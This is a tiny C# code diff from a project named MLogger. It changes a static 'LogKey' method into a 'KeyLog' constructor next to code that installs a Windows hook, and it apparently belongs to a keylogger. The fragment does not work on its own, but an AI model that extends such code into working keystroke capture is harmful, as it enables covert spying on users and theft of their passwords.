@@ -17,7 +17,7 @@ namespace MLogger
         private static IntPtr _hookID = IntPtr.Zero;
         private static Process procc;
 
-        public static void LogKey()
+        public KeyLog()
         {
 
             _hookID = SetHook(_proc);
